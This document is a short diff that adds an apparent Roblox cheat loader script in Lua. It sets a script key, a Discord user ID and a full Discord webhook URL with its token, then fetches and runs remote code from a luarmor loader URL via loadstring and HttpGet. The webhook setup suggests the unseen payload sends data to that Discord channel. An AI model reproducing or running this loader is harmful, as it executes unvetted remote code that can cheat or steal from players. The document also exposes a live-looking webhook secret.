@@ -1,0 +1,4 @@
+script_key = "xznlDbCHnLICEciRYOPSEbLNyuekhFSq";
+_G.GWEBHOOK_USERID = "344054115539615745"
+_G.GWEBHOOK_LINK = "https://discord.com/api/webhooks/1296144952929161226/iqVNFtgy8CWOC0qIWFtwzMpA6XbLaw8sXFF1U3kUn100ofgkmshw0x5m_8ogBorvUVgM"
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/227eb25ff80e539736b501597de3df61.lua"))()
